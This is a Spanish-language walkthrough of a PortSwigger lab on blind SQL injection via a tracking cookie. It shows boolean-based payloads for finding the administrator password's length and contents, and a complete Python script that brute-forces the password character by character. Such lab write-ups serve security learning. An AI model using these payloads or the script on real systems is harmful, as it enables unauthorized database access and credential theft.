**En qué consiste una inyección SQL de tipo blind?**
Una **inyección SQL de tipo _blind_ (SQL Injection Blind o ciega)** es una técnica de ataque en la que el atacante interactúa con una base de datos a través de una aplicación web, **pero no recibe directamente los resultados de las consultas SQL manipuladas**. Es decir, la aplicación no muestra mensajes de error ni resultados evidentes, lo que obliga al atacante a inferir la información **indirectamente**, por ejemplo, observando diferencias en el comportamiento de la aplicación (como tiempos de respuesta o contenido de las páginas).

**Objetivo y descripción del laboratorio:** 
Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis, y realiza una consulta SQL que contiene el valor de la cookie presentada.
Los resultados de la consulta SQL no se devuelven, y no se muestran mensajes de error. Pero la aplicación incluye un mensaje de "Welcome Back!" en la página si la consulta devuelve alguna fila.
En este Laboratorio Debe aprovechar la vulnerabilidad de inyección SQL ciega para descubrir la contraseña del usuario administrador. Para resolver la práctica de laboratorio, inicie sesión como usuario administrador.

![[Pasted image 20250723203151.png]]

Vamos a colocar una comilla y una consulta tipo `UNION` en el campo `category`, a ver si vemos un error.

![[Pasted image 20250723203332.png]]

![[Pasted image 20250723203628.png]]

Vemos, que al colocar una comilla y la consulta `UNION`, no hay ningún error representado en la web. Vamos a hacer uso de BurpSuite para ver más a detalle las consultas que enviamos.
La descripción del laboratorio nos dice que el campo vulnerable es `cookie`.
Al enviar una petición normal, vemos el mensaje `Welcome back!`.

![[Pasted image 20250723210120.png]]

Pero cuando colocamos una comilla en el campo `Cookie`, vemos que el mensaje desaparece.

![[Pasted image 20250723210343.png]]
![[Pasted image 20250723210422.png]]

Entonces podemos pensar que por detrás está funcionando una consulta similar a esta: 
`SELECT * FROM products WHERE TrackingId='rU9oSAoIqZqeG06b'`
Ahora que sabemos que la web responde mostrando el mensaje `Welcome back!` en caso de una consulta correcta, podemos aprovecharnos de este campo para determinar si nuestras consultas son correctas. Estaremos haciendo uso de los condicionales `AND` y `OR` para realizar las consultas. Por ejemplo: `rU9oSAoIqZqeG06b' AND 1=1-- -` al enviar esta consulta, la web debería mostrar el mensaje `Welcome back!`, ya que la cookie es correcta y `1=1` es verdadero.

![[Pasted image 20250723211634.png]]
![[Pasted image 20250723211659.png]]

La descripción del laboratorio nos dice que existe una tabla `users` con dos columnas: `username` y `password`. Y tenemos como objetivo loguearnos como el usuario  `administrator`, entonces, para conocer la contraseña de este usuario, debemos ir fuzzeando letra por letra y hacer uso de un `AND`, para ver si la letra es la correcta, veríamos el mensaje `Welcome back!` representado en la web. Para ello, haremos uso de la siguiente consulta.

Consulta para averiguar la contraseña de un usuario SQLI blind: `rU9oSAoIqZqeG06b' AND (SELECT substring(username,1,1) FROM users WHERE username='administrator')='a'-- -`

Esta consulta, lo que hace es evalúa el valor de la `cookie` (que es verdadero) y que el primer carácter del usuario `administrator` ("a") sea igual a la letra "a" (verdadero, "a" = "a"). Esta consulta nos va a permitir mediante un script automatizado (reemplazando el `username` por `password`), ir probando los distintos caracteres del abecedario y determinar los que coincidan con los caracteres de la contraseña del usuario `administrator`.

![[Pasted image 20250723215831.png]]
![[Pasted image 20250723215846.png]]

Ahora, queremos averiguar la longitud de la contraseña, lo haremos con la siguiente consulta:

Consulta para averiguar la longitud de la contraseña de un usuario SQLI blind: `' AND (SELECT substring(username,1,1) FROM users WHERE username='administrator' and length(password)>8)='a'-- -`

![[Pasted image 20250723230216.png]]
![[Pasted image 20250723230239.png]]

Vemos que la contraseña del usuario `administrator` tiene una longitud mayor a 8, ya que la línea `length(password)>8` ha devuelto, verdadero. 

![[Pasted image 20250723230709.png]]
![[Pasted image 20250723230239.png]]

Vemos que la contraseña tiene más de 19 caracteres, probaremos con 20.

![[Pasted image 20250723230846.png]]
![[Pasted image 20250723210422.png]]

La contraseña, tiene más de 19 caracteres, pero no más de 20, por lo tanto la longitud de la contraseña es 20.
vamos a crearnos un script en python, llamado `sqli_conditional_error.py`que nos permita fuzzear los caracteres de la contraseña de `administrator`.
## Código del Script

```python
#!/usr/bin/env python3
from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#ctrl + C
signal.signal(signal.SIGINT, def_handler)

page_url = input("Ingrese la url: ")
caracteres = str(string.digits + string.ascii_lowercase + string.ascii_uppercase) #todos los caracteres
cookie = input("Ingrese la cookie: ")
sessionHash = input("Ingrese el hash de session: ")

def makeRequest():
    password = ''

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    progressPass = log.progress('Password')

    for posicion in range(1,21): #1..20
        for caracter in caracteres:
            cookies = {
                'TrackingId': "%s' AND (SELECT substring(password,%d,1) FROM users WHERE username='administrator')='%s'-- -" % (cookie,posicion,caracter),
                'session': sessionHash
            }

            p1.status(cookies['TrackingId'])

            r=requests.get(url=page_url, cookies=cookies)

            if 'Welcome back!' in r.text:
                password += caracter
                progressPass.status(password)
                break


if __name__ == '__main__':
    makeRequest()
```

## Análisis del Código

### Importaciones y configuración inicial

```python
from pwn import *
import requests, signal, time, pdb, sys, string
```

- **pwn**: Librería para exploits que proporciona barras de progreso útiles
- **requests**: Para hacer peticiones HTTP
- **signal**: Para manejar la interrupción con Ctrl+C
- **string**: Para obtener caracteres alfanuméricos

### Manejo de señales

```python
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
```

Permite salir limpiamente del script con Ctrl+C.

### Configuración de parámetros

```python
page_url = input("Ingrese la url: ")
caracteres = str(string.digits + string.ascii_lowercase + string.ascii_uppercase)
cookie = input("Ingrese la cookie: ")
sessionHash = input("Ingrese el hash de session: ")
```

- Solicita la URL del lab vulnerable
- Define el conjunto de caracteres a probar (0-9, a-z, A-Z)
- Pide las cookies necesarias (TrackingId y session)

### Ataque de fuerza bruta blind

```python
for posicion in range(1,21): #1..20
    for caracter in caracteres:
        cookies = {
            'TrackingId': "%s' AND (SELECT substring(password,%d,1) FROM users WHERE username='administrator')='%s'-- -" % (cookie,posicion,caracter),
            'session': sessionHash
        }
```
### Payload utilizado

```sql
' AND (SELECT substring(password,POSICION,1) FROM users WHERE username='administrator')='CARACTER'-- -
```

### Funcionamiento de la técnica blind

1. **Extracción carácter por carácter**: Para cada posición (1-20) prueba cada caracter posible
2. **Condición booleana**: La consulta devuelve TRUE si el caracter en esa posición coincide
3. **Indicador de éxito**: Si aparece "Welcome back!" en la respuesta, el caracter es correcto
4. **Construcción progresiva**: Va construyendo la contraseña carácter a carácter

### Ejemplo de funcionamiento

- Posición 1, prueba 'a': `substring(password,1,1)='a'` → No aparece "Welcome back!"
- Posición 1, prueba 'p': `substring(password,1,1)='p'` → Aparece "Welcome back!" → password = "p"
- Posición 2, prueba 'a': `substring(password,2,1)='a'` → Aparece "Welcome back!" → password = "pa"

## Características específicas del lab PortSwigger

Este script está diseñado específicamente para labs donde:

- Existe una tabla `users` con columnas `username` y `password`
- El usuario objetivo es `administrator`
- La respuesta exitosa contiene el texto "Welcome back!"
- La vulnerabilidad está en la cookie `TrackingId`

![[Pasted image 20250724100641.png]]

**Ahora nos logueamos como el usuario administrador**
****

![[Pasted image 20250724100824.png]]
![[Pasted image 20250724100901.png]]